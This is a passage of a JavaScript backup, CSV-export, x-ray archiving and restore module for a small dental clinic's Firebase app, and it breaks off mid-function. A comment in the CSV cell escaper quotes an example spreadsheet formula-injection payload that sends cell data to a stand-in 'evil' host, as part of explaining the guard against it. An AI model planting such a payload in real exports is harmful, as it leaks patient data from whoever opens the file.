// ─────────────────────────────────────────────────────────────
// DentCare – js/backup.js (Disaster recovery, archiving & restore)
// ─────────────────────────────────────────────────────────────
//
// ── WHY THIS MODULE EXISTS ───────────────────────────────────────────────
//
// This clinic already lost every patient record it had. It sits in a
// flood-prone part of Naga City, the water reached the paper files, and the
// histories were gone — not corrupted, gone. Digitising the clinic is the
// answer to that, but only if the digital copy cannot be lost the same way,
// and "it is in the cloud" is not by itself an answer: an account can be
// locked, a free tier can be exceeded, a project can be deleted by mistake.
//
// So this module is the point of the whole system, not an accessory to it.
// Everything here is built so a copy of the clinic's data can leave Firebase
// and sit on a hard drive Dr. Reina can hold.
//
// ── THE 5 GB PROBLEM ─────────────────────────────────────────────────────
//
// The project is on Firebase's free tier: 5 GB of Cloud Storage. Firestore
// documents are small and will not trouble that for years. X-rays will — a
// few hundred scans is gigabytes, and when the bucket fills, uploads simply
// start failing.
//
// Hence the archive path: an x-ray is downloaded to the clinic's external
// drive and then deleted from the bucket, while its metadata row STAYS in
// Firestore marked archived. The record of the x-ray having been taken is
// permanent and costs almost nothing; only the heavy pixels move offsite.
//
// ── WHAT RESTORE CAN AND CANNOT DO ───────────────────────────────────────
//
// Restore is deliberately additive. It writes documents back; it never
// deletes anything already present. A restore run against a live database
// should be able to fill gaps without destroying whatever survived, because
// the moment somebody is restoring they are already having a bad day.
//
// Some collections cannot be fully restored by an ordinary account, and the
// module says so rather than failing silently — see restoreBackup().
// ─────────────────────────────────────────────────────────────

/**
 * The collections that make up "the clinic's records".
 *
 * Ordered so that anything referenced by something else is written first: a
 * bill names a patient, and a restore that wrote bills before patients would
 * be refused by billNamesAPatient() in firestore.rules.
 */
const BACKUP_COLLECTIONS = [
    "users",
    "patients",
    "dentists",
    "treatments",
    "appointments",
    "dental_records",
    "billing",
    "payments",
    // Which receipts were voided, and why. Without this a restore brings back
    // every receipt as though none had ever been reversed.
    "payment_voids",
    "inventory",
    "inventory_movements",
    "availability",
    "patient_files",
    "conversations",
    "messages",
    // Original text of unsent messages. Owner-only in Firestore; keep it in the
    // disaster backup so a restored clinical conversation retains its audit.
    "message_unsend_audit",
    // Earlier wording of edited messages (2026-09-24). Owner-only, append-only,
    // kept for the same reason as the unsend audit.
    "message_edit_audit",
    // Which appointment slots are taken. Small, and the booking form is built
    // entirely from it — a restore that brought back the appointments without
    // these would offer every already-booked hour to a second patient until
    // somebody pressed Rebuild booking slots. Cheap insurance; the rebuild is
    // still the thing that fixes it properly, because a lock restored for an
    // appointment that did not come back would block an hour for nobody.
    "slot_locks",
    // Who restored what, and from which backup (2026-09-14). Append-only.
    "restore_log"
];

/** Bump when the export shape changes, so a restore can tell what it has. */
const BACKUP_FORMAT_VERSION = 2;

/** Only the clinic's own accounts may take a backup, or archive an x-ray. */
function canManageBackups() {
    return currentRole === "dentist" || currentRole === "admin";
}

/**
 * Restoring is for the clinic's owner. Exporting is for her and her staff.
 *
 * ── WHY THIS IS NOT SIMPLY canManageBackups() ─────────────────────────────
 *
 * A restore writes across nearly every collection, and several of them are
 * owner-only in firestore.rules — users, dentists, and the deletes. Letting the
 * front desk press it would produce a restore that half worked, with the
 * refusals listed in a report nobody reads during a crisis.
 *
 * ── WHY THE DENTIST IS BACK IN ────────────────────────────────────────────
 *
 * This was briefly admin-only, on the reasoning that a dentist-run restore
 * silently refused the patient list, the price list and the inventory — all
 * written under isStaff(), which a dentist is not.
 *
 * That reasoning was right about the symptom and wrong about the fix. The
 * clinic has no admin account and does not want one: it is two people, and the
 * dentist IS the owner. So "admin-only" did not route the job to the right
 * person, it routed it to nobody — in a module that exists because this clinic
 * once lost every record it had.
 *
 * The rules now grant the owner what the job needs (see isOwner() in
 * firestore.rules), so the dentist can genuinely complete a restore rather than
 * getting halfway.
 *
 * Exporting stays open to staff as well. Taking a backup is the habit worth
 * encouraging, it is read-only, and nobody should ever be blocked from it.
 */
function canRestoreBackups() {
    return currentRole === "dentist" || currentRole === "admin";
}

// ─────────────────────────────────────────────────────────────
// Export
// ─────────────────────────────────────────────────────────────

/** Plain names for the collections, for messages the doctor reads. */
const BACKUP_COLLECTION_LABELS = {
    users: "accounts", patients: "patients", dentists: "dentist profile",
    treatments: "services and prices", appointments: "appointments",
    dental_records: "treatment logs", billing: "bills", payments: "receipts",
    payment_voids: "voided receipts", inventory: "stock",
    inventory_movements: "stock history", availability: "schedule",
    patient_files: "x-ray list", conversations: "message threads",
    messages: "messages", message_unsend_audit: "unsent-message audit",
    message_edit_audit: "edited-message audit",
    slot_locks: "booked time slots",
    restore_log: "restore history"
};

function backupLabel(name) {
    return BACKUP_COLLECTION_LABELS[name] || name;
}

/**
 * "These could not be saved" in words the doctor can act on.
 *
 * ── WHY THE NOTE NAMES THE RULES ────────────────────────────────────────
 * Found 2026-09-15: every backup said "Incomplete … payment_voids,
 * restore_log". Those two collections were added on 2026-09-13/14, and the live
 * Firebase rules had not been published since, so the rules refused them. The
 * file was right to record them as null. But the message named the collections
 * and not the cause, and a doctor cannot act on "payment_voids".
 */
function backupGapHtml(failed) {
    if (!failed.length) return "";
    return '<p class="backup-warn"><strong>Almost complete.</strong> ' +
           failed.length + ' kind' + (failed.length === 1 ? '' : 's') +
           ' of record could not be read and ' + (failed.length === 1 ? 'is' : 'are') +
           ' not in the file: ' + escapeHtml(failed.map(backupLabel).join(", ")) +
           '. Everything else is saved. This usually means the updated Firebase ' +
           'security rules have not been published yet. Publish them, then take ' +
           'the backup again.</p>';
}

/**
 * Read every collection into one backup object. Nothing is downloaded here.
 *
 * Shared by the full-backup button and by the patient-records ZIP, which
 * carries the same file inside it so one download can also be restored from.
 *
 * A collection that cannot be read is stored as null, never as {}. On restore,
 * null means "could not be read when this was taken" and is skipped with a
 * note. {} means "read, and empty". A key that is missing altogether means the
 * backup is older than that collection. None of the three is an error.
 *
 * @param {function(string, number, number)} [onProgress]  name, index, total
 * @return {Promise<{backup: object, failed: string[], totalDocs: number}>}
 */
function collectDatabaseBackup(onProgress) {
    const backup = {
        format: "dentcare-backup",
        version: BACKUP_FORMAT_VERSION,
        exportedAt: new Date().toISOString(),
        exportedBy: currentEmail || currentUserId || "",
        projectId: (typeof firebaseConfig === "object" && firebaseConfig.projectId) || "",
        collections: {}
    };

    const failed = [];
    let totalDocs = 0;

    const readNext = (i) => {
        if (i >= BACKUP_COLLECTIONS.length) return Promise.resolve();

        const name = BACKUP_COLLECTIONS[i];
        if (onProgress) onProgress(name, i, BACKUP_COLLECTIONS.length);

        return db.collection(name).get()
            .then(snap => {
                const docs = {};
                snap.forEach(doc => { docs[doc.id] = doc.data(); });
                backup.collections[name] = docs;
                totalDocs += snap.size;
            })
            .catch(err => {
                // A collection the signed-in role cannot read is recorded as a
                // gap IN THE FILE, not skipped quietly. A backup that silently
                // omits payments looks complete and is not.
                console.error("Could not read " + name + ":", err);
                failed.push(name);
                backup.collections[name] = null;
            })
            .then(() => readNext(i + 1));
    };

    return readNext(0).then(() => {
        backup.incomplete = failed;
        backup.documentCount = totalDocs;
        return { backup: backup, failed: failed, totalDocs: totalDocs };
    });
}

/** "dentcare-backup_2026-09-15_1430.json" */
function backupFileName() {
    const now = new Date();
    return "dentcare-backup_" + localDateKey() + "_" +
           String(now.getHours()).padStart(2, "0") + String(now.getMinutes()).padStart(2, "0") + ".json";
}

/**
 * Read every collection and hand the operator a .json file.
 *
 * Collections are read one at a time rather than in parallel. A parallel read
 * of fourteen collections is faster and, on the clinic's connection, more
 * likely to have one of them time out — and a backup missing a collection it
 * did not mention is worse than a slow backup.
 */
function exportDatabaseBackup() {
    if (!canManageBackups()) {
        showToast("Only Dr. Gapit or an admin can export the clinic's records.", "error");
        return;
    }

    const status = backupEl("backup-status");
    const setStatus = (html) => { if (status) status.innerHTML = html; };

    setStatus('<p class="backup-progress">Starting export…</p>');

    return collectDatabaseBackup((name, i, total) => {
        setStatus('<p class="backup-progress">Reading <strong>' + escapeHtml(backupLabel(name)) +
                  '</strong>… (' + (i + 1) + ' of ' + total + ')</p>');
    }).then(({ backup, failed, totalDocs }) => {
        downloadBlob(
            new Blob([JSON.stringify(backup, null, 2)], { type: "application/json" }),
            backupFileName()
        );

        let msg = '<p class="backup-ok"><strong>Backup downloaded.</strong> ' +
                  totalDocs + ' records.</p>';

        msg += backupGapHtml(failed);

        msg += '<p class="backup-note">Copy this file to the external drive now. ' +
               'A backup that only exists on this computer is in the same room as the ' +
               'thing it is protecting against.</p>';

        setStatus(msg);
        showToast("Backup exported — " + totalDocs + " records.", "success");
    });
}

/**
 * Export one collection as CSV, for reading in Excel.
 *
 * Separate from the JSON export and NOT a substitute for it. CSV is a flat
 * format and this data is not flat — a patient's teethStatus is a nested map,
 * a bill has an array of line items. Those are written as JSON text inside
 * their cell, which is readable but not reliably re-importable.
 *
 * So: JSON is the backup. CSV is for looking at.
 */
function exportCollectionCsv(name) {
    if (!canManageBackups()) return;

    const status = backupEl("backup-status");
    if (status) {
        status.innerHTML = '<p class="backup-progress">Reading ' + escapeHtml(name) + '…</p>';
    }

    db.collection(name).get().then(snap => {
        if (snap.empty) {
            showToast("Nothing in " + name + " to export.", "info");
            if (status) status.innerHTML = '<p class="backup-note">' + escapeHtml(name) + ' is empty.</p>';
            return;
        }

        const rows = [];
        const columns = new Set(["_id"]);
        snap.forEach(doc => {
            const data = doc.data();
            Object.keys(data).forEach(k => columns.add(k));
            rows.push(Object.assign({ _id: doc.id }, data));
        });

        const cols = Array.from(columns);
        const csv = [cols.map(csvCell).join(",")]
            .concat(rows.map(r => cols.map(c => csvCell(r[c])).join(",")))
            .join("\r\n");

        // BOM so Excel reads it as UTF-8. Without it a patient named Peña
        // opens as "PeÃ±a", which looks like corrupted data in a file whose
        // whole job is to prove the data is intact.
        downloadBlob(
            new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8;" }),
            "dentcare_" + name + "_" + localDateKey() + ".csv"
        );

        if (status) {
            status.innerHTML = '<p class="backup-ok">' + escapeHtml(name) + ' exported — ' +
                               rows.length + ' rows.</p>';
        }
    })
    .catch(err => {
        console.error("CSV export failed:", err);
        showToast("Could not export " + name + ".", "error");
    });
}

/** One CSV cell, quoted and escaped. */
function csvCell(value) {
    if (value === null || value === undefined) return "";

    // Nested maps and arrays are written as JSON inside the cell. Flattening
    // them into columns would invent a column per tooth per patient.
    const text = (typeof value === "object")
        ? JSON.stringify(value)
        : String(value);

    // ── SPREADSHEET FORMULA INJECTION ──────────────────────────────────
    //
    // Quoting makes a cell PARSE correctly. It does nothing about what Excel
    // does with the contents afterwards: a cell beginning = + - @ tab or
    // carriage return is read as a formula, and Excel strips the surrounding
    // quotes before deciding that. So the CSV rule below is necessary and not
    // sufficient.
    //
    // The attack this clinic would actually see: a patient registers with a
    // surname of
    //     =HYPERLINK("http://evil/?x="&A1,"Invoice")
    // staff exports Patients to CSV, and the DOCTOR opens it in Excel —
    // which the Backup tab tells her in as many words to do. The payload runs
    // on her machine, with whatever her account can reach, and nothing in the
    // app was involved in the execution at all.
    //
    // A leading apostrophe is Excel's own "treat this as text" marker. Excel
    // and LibreOffice both consume it rather than display it, so the cell
    // still reads as the name the patient typed.
    //
    // NUMBERS ARE LEFT ALONE ON PURPOSE. A stock movement of -2 begins with a
    // minus and must stay a number, or the doctor's spreadsheet stops adding
    // up. Only a leading trigger character that is NOT part of a plain number
    // gets the guard.
    const looksNumeric = /^-?[0-9]+(\.[0-9]+)?$/.test(text.trim());
    const guarded = (!looksNumeric && /^[=+\-@\t\r]/.test(text)) ? "'" + text : text;

    // Every cell is quoted, and inner quotes doubled — the CSV rule. Clinical
    // notes contain commas, quotes and newlines as a matter of course.
    return '"' + guarded.replace(/"/g, '""') + '"';
}

/**
 * Hand a Blob to the browser as a download.
 *
 * The object URL is revoked afterwards; without that, every export holds its
 * whole file in memory until the tab is closed, and a full clinic backup is
 * not small.
 */
function downloadBlob(blob, filename) {
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(() => URL.revokeObjectURL(url), 30000);
}

// ─────────────────────────────────────────────────────────────
// X-ray archiving — the 5 GB answer
// ─────────────────────────────────────────────────────────────

/**
 * Download an x-ray to the local drive, then remove it from Cloud Storage.
 *
 * The Firestore metadata row is KEPT and marked archived, so the clinic can
 * always answer "was an x-ray taken on this date?" even years after the image
 * itself moved to the external drive. Deleting the row too would save a few
 * hundred bytes and lose the fact that the x-ray ever existed.
 *
 * Order matters and is deliberate: the file is fetched and handed to the
 * operator FIRST, and only then deleted from the bucket. Deleting first would
 * be faster and would risk destroying the only copy if the download failed.
 */
function archiveXrayLocal(fileId) {
    if (!canManageBackups()) {
        showToast("Only Dr. Gapit or an admin can archive files.", "error");
        return;
    }

    const ref = db.collection("patient_files").doc(fileId);

    ref.get().then(doc => {
        if (!doc.exists) {
            showToast("That file record no longer exists.", "error");
            return;
        }

        const f = doc.data();
        if (f.archived) {
            showToast("That file is already archived to the external drive.", "info");
            return;
        }

        return confirmDialog(
            "Archive \"" + (f.fileName || "this file") + "\" to local storage?\n\n" +
            "The file downloads to this computer and is then REMOVED from cloud storage " +
            "to free space.\n\n" +
            "Save it to the clinic's external drive. It will not be recoverable from " +
            "Firebase afterwards.",
            { title: "Archive X-ray file?", confirmLabel: "Download and archive", tone: "danger" }
        ).then(yes => {
        if (!yes) return;

        showToast("Downloading before removing from the cloud…", "info");

        // Fetched rather than link-clicked so the delete can wait for the
        // bytes to actually be in hand. A plain <a download> gives no signal
        // that the file arrived.
        return fetch(f.downloadUrl)
            .then(res => {
                if (!res.ok) throw new Error("Download failed: HTTP " + res.status);
                return res.blob();
            })
            .then(blob => {
                downloadBlob(blob, f.fileName || ("xray_" + fileId));

                // Give the browser a moment to commit the file before the
                // cloud copy goes.
                return new Promise(resolve => setTimeout(resolve, 1200));
            })
            .then(() => {
                if (!f.storagePath || typeof firebase.storage !== "function") return null;
                return firebase.storage().ref(f.storagePath).delete();
            })
            // Where it went, in the operator's own words. Without this the
            // record says the file is offsite but not offsite WHERE, which
            // is useless at the moment somebody needs to find it.
            .then(() => promptDialog("The cloud copy is removed. Where was the file saved?",
                "Clinic external drive",
                { title: "Archive location", label: "Saved to", confirmLabel: "Save location",
                  field: { placeholder: "e.g. Clinic external drive / 2026 X-rays", maxLength: 200 } }))
            .then(location => ref.update({
                archived: true,
                archivedAt: new Date().toISOString(),
                archivedBy: currentUserId,
                archiveLocation: (location || "Local archive").slice(0, 200),
                downloadUrl: "",
                storagePath: ""
            }))
            .then(() => {
                showToast("Archived. Cloud storage freed; the record is kept.", "success");
                if (typeof loadXrayFiles === "function" && typeof selectedPatientId !== "undefined") {
                    loadXrayFiles(selectedPatientId);
                }
            });
        });
    })
    .catch(err => {
        console.error("Archive failed:", err);
        // Says explicitly that nothing was destroyed. The one thing an
        // operator needs to know after a failed archive is whether they still
        // have the file.
        showToast("Archive failed — the file was NOT removed from the cloud. " +
                  (err.message || ""), "error");
    });
}

// ─────────────────────────────────────────────────────────────
// Restore
// ─────────────────────────────────────────────────────────────
//
// ── REBUILT 2026-09-14 ───────────────────────────────────────────────────
//
// What the clinic asked for: pick a backup FILE, or a whole FOLDER of them
// (the external drive's backup folder), and get the records back — all of
// them, not just the parts the everyday security rules happen to allow.
//
// How it works, in the order the screen walks through it:
//
//   1. Choose files or a folder. Every .json inside is read in this browser —
//      nothing is uploaded to read it, so this works on the free Spark plan.
//      Anything that is not a DentCare backup is listed as skipped.
//   2. Pick which backup to restore (newest is pre-selected) and see exactly
//      what it holds before anything is written.
//   3. Restore mode. The owner opens a 60-minute window, stamped by the server
//      and recorded under her name (system/restore_mode, inRestoreMode() in
//      firestore.rules). Inside it, the restore may put back the records the
//      rules normally tie to their original author: receipts, messages, stock
//      movements, paid bills, x-ray rows.
//   4. By default only MISSING records are written. Records that still exist
//      are left exactly as they are — the live copy is newer than any backup.
//      An option replaces the everyday records (patients, appointments,
//      services, stock, schedule) with the backup's copy; receipts, voids,
//      messages and stock history are never overwritten, by the rules as well
//      as by this code.
//   5. A report of what came back, what was already there, and what was
//      refused and why, plus one restore_log row. The window closes itself.
//
// ── THE FREE PLAN'S DAILY LIMIT ─────────────────────────────────────────────
// Spark allows 50,000 reads and 20,000 writes a day. Restoring missing-only
// reads each collection once (to see what is there) and writes only what is
// missing, and it is safe to run again: a restore stopped by the daily limit
// simply continues the next day from what is still missing.

/** The parsed backup waiting for confirmation, or null. */
let pendingRestore = null;

/** Every valid backup found in the chosen files/folder, newest first. */
let stagedBackups = [];

/** Name of the file the pending backup came from, for the log. */
let pendingRestoreFile = "";

/** Collections whose existing documents are NEVER overwritten by a restore. */
const RESTORE_APPEND_ONLY = ["payments", "payment_voids", "messages",
                             "message_unsend_audit", "message_edit_audit",
                             "inventory_movements", "restore_log"];

/** Spark's daily write allowance, used only to warn before a large restore. */
const SPARK_DAILY_WRITES = 20000;

const RESTORE_WINDOW_MS = 60 * 60 * 1000;

/**
 * Read the chosen file(s) — from the file picker or the folder picker — and
 * list every DentCare backup found.
 *
 * Nothing is written here. A restore that starts the moment a file is picked
 * would be a data-loss incident one misclick away, so this stage only reads
 * the files and reports; the operator then has to confirm in the panel.
 */
function stageRestoreFile(input) {
    const status = backupEl("restore-status");
    const setStatus = (html) => { if (status) status.innerHTML = html; };

    pendingRestore = null;
    pendingRestoreFile = "";
    stagedBackups = [];
    const btn = backupEl("restore-confirm-btn");
    if (btn) btn.classList.add("hidden");

    // A .json backup, or the .zip from "Export all patient records", which
    // carries the same backup file inside it (2026-09-15). The doctor picks the
    // one file she was given and never has to open it.
    const files = Array.from((input && input.files) || [])
        .filter(f => /\.(json|zip)$/i.test(f.name || ""));
    if (!files.length) {
        setStatus('<p class="backup-warn">No backup was found in that selection. Choose the ' +
                  '<strong>.zip</strong> from Export all patient records, or a ' +
                  '<strong>dentcare-backup .json</strong> file.</p>');
        return;
    }

    setStatus('<p class="backup-progress">Reading ' + files.length + ' file' +
              (files.length === 1 ? '' : 's') + '…</p>');

    const skipped = [];

    /** Keep the text if it is a DentCare backup; note why if it is not. */
    const accept = (label, text) => {
        let parsed;
        try {
            parsed = JSON.parse(text);
        } catch (err) {
            skipped.push(label + " (not valid JSON)");
            return;
        }
        if (!parsed || parsed.format !== "dentcare-backup" || !parsed.collections) {
            skipped.push(label + " (not a DentCare backup)");
            return;
        }
        // The same backup twice: a folder holding the ZIP AND the folder it
        // was unzipped into. Listed once, so the doctor is not asked to choose
        // between two identical copies.
        const twin = stagedBackups.some(b =>
            b.data.exportedAt === parsed.exportedAt &&
            b.data.exportedBy === parsed.exportedBy &&
            b.data.documentCount === parsed.documentCount);
        if (twin) return;
        stagedBackups.push({ file: label, data: parsed });
    };

    const readJson = (file) => new Promise(resolve => {
        const reader = new FileReader();
        reader.onerror = () => { skipped.push(file.name + " (could not be read)"); resolve(); };
        reader.onload = () => { accept(file.webkitRelativePath || file.name, reader.result); resolve(); };
        reader.readAsText(file);
    });

    // Opened in this browser, like a .json: nothing is uploaded anywhere. Only
    // the .json entries are read out; the PDFs beside them are never unpacked.
    const readZip = (file) => {
        if (typeof JSZip === "undefined" && typeof loadReportLibrary === "function") {
            // Fetched on first use rather than on every portal load.
            return loadReportLibrary("jszip").then(() => readZip(file), () => {
                skipped.push(file.name + " (the ZIP reader did not load; check the connection)");
            });
        }
        if (typeof JSZip === "undefined") {
            skipped.push(file.name + " (the ZIP reader did not load; reload the page)");
            return Promise.resolve();
        }
        return JSZip.loadAsync(file)
            .then(zip => {
                const entries = Object.keys(zip.files)
                    .map(k => zip.files[k])
                    .filter(entry => !entry.dir && /\.json$/i.test(entry.name));
                if (!entries.length) {
                    skipped.push(file.name + " (no backup file inside)");
                    return;
                }
                return entries.reduce((chain, entry) => chain.then(() =>
                    entry.async("string").then(text => accept(file.name + " › " + entry.name, text))
                ), Promise.resolve());
            })
            .catch(err => {
                console.warn("Could not open " + file.name + ":", err);
                skipped.push(file.name + " (not a readable ZIP)");
            });
    };

    const readOne = (file) => (/\.zip$/i.test(file.name || "") ? readZip(file) : readJson(file));

    // One at a time: a folder of full backups can be large, and reading them
    // all at once can exhaust a clinic computer's memory.
    files.reduce((chain, f) => chain.then(() => readOne(f)), Promise.resolve())
    .then(() => {
        stagedBackups.sort((a, b) =>
            String(b.data.exportedAt || "").localeCompare(String(a.data.exportedAt || "")));

        if (!stagedBackups.length) {
            setStatus('<p class="backup-warn"><strong>That is not a DentCare backup.</strong> ' +
                      'Expected a file exported by this panel.</p>' + restoreSkippedHtml(skipped));
            return;
        }

        renderBackupChoice(skipped);
        chooseStagedBackup(0);
    });
}

function restoreSkippedHtml(skipped) {
    if (!skipped.length) return "";
    return '<p class="backup-note">Skipped: ' + escapeHtml(skipped.slice(0, 8).join(", ")) +
           (skipped.length > 8 ? " and " + (skipped.length - 8) + " more" : "") + '.</p>';
}

/** When a folder held several backups, offer them newest first. */
function renderBackupChoice(skipped) {
    const host = backupEl("restore-choice");
    if (!host) return;

    if (stagedBackups.length < 2) {
        host.innerHTML = restoreSkippedHtml(skipped);
        return;
    }

    host.innerHTML =
        '<p class="field-hint">' + stagedBackups.length + ' backups found. The newest is ' +
        'selected; choose another if you need an older copy.</p>' +
        '<div class="restore-choice__list">' +
        stagedBackups.map((b, i) =>
            '<label class="restore-choice__item">' +
                '<input type="radio" name="restore-choice" value="' + i + '"' +
                    (i === 0 ? ' checked' : '') + ' onchange="chooseStagedBackup(' + i + ')">' +
                '<span><strong>' + escapeHtml(formatBackupWhen(b.data.exportedAt)) + '</strong>' +
                '<span class="restore-choice__meta">' + escapeHtml(b.file) + ' · ' +
                    Number(b.data.documentCount || 0).toLocaleString("en-PH") + ' records</span></span>' +
            '</label>').join("") +
        '</div>' + restoreSkippedHtml(skipped);
}

function formatBackupWhen(iso) {
    const d = iso ? new Date(iso) : null;
    return d && !isNaN(d.getTime())
        ? d.toLocaleString("en-PH", { dateStyle: "medium", timeStyle: "short" })
        : "Unknown date";
}

/** Show what the chosen backup holds, and offer the restore. */
function chooseStagedBackup(index) {
    const chosen = stagedBackups[index];
    if (!chosen) return;
    const parsed = chosen.data;
    pendingRestore = parsed;
    pendingRestoreFile = chosen.file;

    const status = backupEl("restore-status");
    const btn = backupEl("restore-confirm-btn");

    const rows = BACKUP_COLLECTIONS.map(name => {
        const bucket = parsed.collections[name];
        const count = (bucket && typeof bucket === "object") ? Object.keys(bucket).length : 0;
        // null: it could not be read when the backup was taken (see
        // collectDatabaseBackup). Absent: the backup is older than this kind of
        // record. Neither is damage; both are simply skipped by the restore.
        const unread = bucket === null;
        const absent = bucket === undefined;
        return '<tr><td>' + escapeHtml(backupLabel(name)) + '</td>' +
               '<td style="text-align:right;">' + (unread || absent ? "—" : count) + '</td>' +
               '<td>' + (unread
                    ? '<span class="backup-warn-inline">could not be read when this backup was taken; skipped</span>'
                    : absent
                    ? '<span class="field-hint">not in this older backup; skipped</span>'
                    : '') + '</td></tr>';
    }).join("");

    if (status) {
        status.innerHTML =
            '<p class="backup-ok"><strong>Backup read.</strong> Taken ' +
                escapeHtml(formatBackupWhen(parsed.exportedAt)) +
                (parsed.exportedBy ? ' by ' + escapeHtml(parsed.exportedBy) : '') + '.</p>' +

            '<div class="oc-table-wrap"><table class="oc-table"><thead><tr>' +
                '<th>What</th><th>Records</th><th></th>' +
            '</tr></thead><tbody>' + rows + '</tbody></table></div>' +

            '<p class="backup-note"><strong>Restoring is additive.</strong> Nothing in the ' +
            'database is ever deleted. By default only records that are missing are put ' +
            'back; records that still exist are left as they are.</p>';
    }

    if (btn) btn.classList.remove("hidden");
}

// ── Restore mode: the 60-minute window ────────────────────────────────────

/** The open window as { openedByName, until: Date }, or null when closed. */
function readRestoreMode() {
    return db.collection("system").doc("restore_mode").get().then(doc => {
        if (!doc.exists) return null;
        const d = doc.data();
        const opened = d.openedAt && typeof d.openedAt.toDate === "function" ? d.openedAt.toDate() : null;
        if (!opened) return null;
        const until = new Date(opened.getTime() + RESTORE_WINDOW_MS);
        return {
            openedBy: d.openedBy,
            openedByName: d.openedByName || "",
            until: until,
            // Judged by our clock only for the label; the rules judge by the server's.
            open: until.getTime() > Date.now()
        };
    });
}

/** Draw the window's state on the panel. */
function renderRestoreMode() {
    const host = backupEl("restore-mode");
    if (!host) return Promise.resolve(null);

    return readRestoreMode().then(mode => {
        if (mode && mode.open) {
            host.innerHTML =
                '<span class="restore-mode__state restore-mode__state--open">Restore mode is open</span>' +
                '<span class="restore-mode__meta">Until ' +
                    escapeHtml(mode.until.toLocaleTimeString("en-PH", { hour: "numeric", minute: "2-digit" })) +
                    (mode.openedByName ? ', opened by ' + escapeHtml(mode.openedByName) : '') + '</span>' +
                '<button type="button" class="btn-secondary btn-sm" onclick="closeRestoreMode()">Close now</button>';
        } else {
            host.innerHTML =
                '<span class="restore-mode__state">Restore mode is off</span>' +
                '<span class="restore-mode__meta">It opens for 60 minutes when you restore, ' +
                    'and closes itself when the restore finishes.</span>';
        }
        return mode;
    }).catch(err => {
        console.warn("Could not read restore mode:", err);
        host.innerHTML = '<span class="restore-mode__meta">Restore mode status could not be read.</span>';
        return null;
    });
}

/** Open a fresh 60-minute window in this account's name. */
function openRestoreMode() {
    const ref = db.collection("system").doc("restore_mode");
    // A window that exists cannot be edited (by design), so an old or expired
    // one is closed first and a new, freshly dated one opened.
    return ref.delete().catch(() => {}).then(() => ref.set({
        openedBy: currentUserId,
        openedByName: currentUser || "",
        openedAt: firebase.firestore.FieldValue.serverTimestamp(),
        reason: "Restoring from a backup file"
    }))
    // The state is read back from the database, not from the panel, so the
    // caller learns whether the window really opened even if the panel is not
    // on screen.
    .then(() => readRestoreMode())
    .then(mode => { renderRestoreMode(); return mode; });
}

function closeRestoreMode() {
    return db.collection("system").doc("restore_mode").delete()
        .catch(err => console.warn("Could not close restore mode:", err))
        .then(() => renderRestoreMode());
}

// ── The restore itself ───────────────────────────────────────────────────

/**
 * Write the staged backup back into Firestore.
 *
 * Collection by collection, in BACKUP_COLLECTIONS order so referenced
 * documents land first. Batched in chunks of 400 (the WriteBatch cap is 500);
 * a refused batch falls back to one document at a time and keeps what the
 * rules allow.
 */
async function restoreBackup() {
    if (!canRestoreBackups()) {
        showToast("Only Dr. Gapit's account can restore a backup. Restoring writes " +
                  "records the security rules reserve for the clinic's owner.", "error");
        return;
    }
    if (!pendingRestore) {
        flagGroup(backupEl("restore-pickers"), "Choose the backup file first.");
        return;
    }

    const replaceBox = backupEl("restore-replace");
    const replaceExisting = !!(replaceBox && replaceBox.checked);

    const backup = pendingRestore;
    const totalInFile = BACKUP_COLLECTIONS.reduce((n, name) => {
        const b = backup.collections[name];
        return n + ((b && typeof b === "object") ? Object.keys(b).length : 0);
    }, 0);

    const quotaWarning = totalInFile > SPARK_DAILY_WRITES * 0.9
        ? "\n\nThis backup holds " + totalInFile.toLocaleString("en-PH") + " records. The free " +
          "plan allows about " + SPARK_DAILY_WRITES.toLocaleString("en-PH") + " writes a day, so " +
          "a large restore may stop part-way. If it does, run it again tomorrow: it continues " +
          "with whatever is still missing."
        : "";

    const answer = await appDialog({
        title: "Restore this backup?", tone: "danger", confirmLabel: "Restore",
        fields: [{ name: "typed", label: "Confirmation word", mustEqual: "RESTORE",
                   mismatch: "Type RESTORE in capital letters to continue.", maxLength: 20 }],
        message:
        "This puts the backup's records back into the live database.\n\n" +
        "• Nothing is deleted.\n" +
        (replaceExisting
            ? "• Records that still exist will be REPLACED with the backup's copy " +
              "(patients, appointments, services, stock, schedule). Receipts, voids, " +
              "messages and stock history are never replaced.\n"
            : "• Only MISSING records are put back. Records that still exist are left alone.\n") +
        "• Restore mode opens for 60 minutes under your name, and closes when this finishes." +
        quotaWarning
    });
    if (!answer.confirmed || answer.values.typed.trim() !== "RESTORE") {
        showToast("Restore cancelled.", "info");
        return;
    }

    const status = backupEl("restore-status");
    const setStatus = (html) => { if (status) status.innerHTML = html; };
    const btn = backupEl("restore-confirm-btn");
    if (btn) btn.disabled = true;

    const written = {};
    const skipped = {};
    const refused = {};
    // How many documents a collection could NOT write, when some of it did.
    const partial = {};
    let stoppedByQuota = false;

    const restoreCollection = (i) => {
        if (i >= BACKUP_COLLECTIONS.length || stoppedByQuota) return Promise.resolve();

        const name = BACKUP_COLLECTIONS[i];
        const bucket = backup.collections[name];
        if (!bucket || typeof bucket !== "object") return restoreCollection(i + 1);

        const allIds = Object.keys(bucket);
        if (!allIds.length) return restoreCollection(i + 1);

        setStatus('<p class="backup-progress">Checking <strong>' + escapeHtml(name) +
                  '</strong> (' + (i + 1) + ' of ' + BACKUP_COLLECTIONS.length + ')…</p>');

        const mayReplace = replaceExisting && RESTORE_APPEND_ONLY.indexOf(name) === -1;

        // What is already there. Skipped entirely when replacing, where every
        // document is written regardless.
        const existing = mayReplace
            ? Promise.resolve(new Set())
            : db.collection(name).get()
                .then(snap => { const s = new Set(); snap.forEach(d => s.add(d.id)); return s; })
                .catch(() => new Set());

        return existing.then(have => {
            const ids = allIds.filter(id => !have.has(id));
            skipped[name] = allIds.length - ids.length;
            written[name] = 0;
            if (!ids.length) return restoreCollection(i + 1);

            setStatus('<p class="backup-progress">Restoring <strong>' + escapeHtml(name) +
                      '</strong>: ' + ids.length + ' record' + (ids.length === 1 ? '' : 's') +
                      ' (' + (i + 1) + ' of ' + BACKUP_COLLECTIONS.length + ')…</p>');

            const CHUNK = 400;
            const chunks = [];
            for (let j = 0; j < ids.length; j += CHUNK) chunks.push(ids.slice(j, j + CHUNK));

            const writeChunk = (c) => {
                if (c >= chunks.length || stoppedByQuota) return Promise.resolve();

                const batch = db.batch();
                chunks[c].forEach(id => {
